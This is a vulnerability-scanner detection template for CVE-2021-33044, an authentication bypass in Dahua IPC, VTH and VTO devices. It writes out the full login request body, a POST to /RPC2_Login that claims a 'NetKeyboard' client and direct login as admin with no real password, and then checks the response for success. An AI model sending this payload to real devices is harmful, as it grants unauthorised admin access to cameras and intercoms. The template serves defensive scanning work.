id: CVE-2021-33044

info:
  name: Dahua IPC/VTH/VTO devices Authentication Bypass
  author: gy741
  severity: critical
  description: |-
    The identity authentication bypass vulnerability found in some Dahua products during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.
  reference:
    - https://github.com/dorkerdevil/CVE-2021-33044
    - https://nvd.nist.gov/vuln/detail/CVE-2021-33044
    - https://seclists.org/fulldisclosure/2021/Oct/13
  tags: dahua,cve,cve2021,auth-bypass
  created: 2024/05/08

rules:
  r0:
    request:
      method: POST
      path: /RPC2_Login
      body: |
        {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"result":true') &&
      response.body.bcontains(b'id') &&
      response.body.bcontains(b'params') &&
      response.body.bcontains(b'session')
expression: r0()
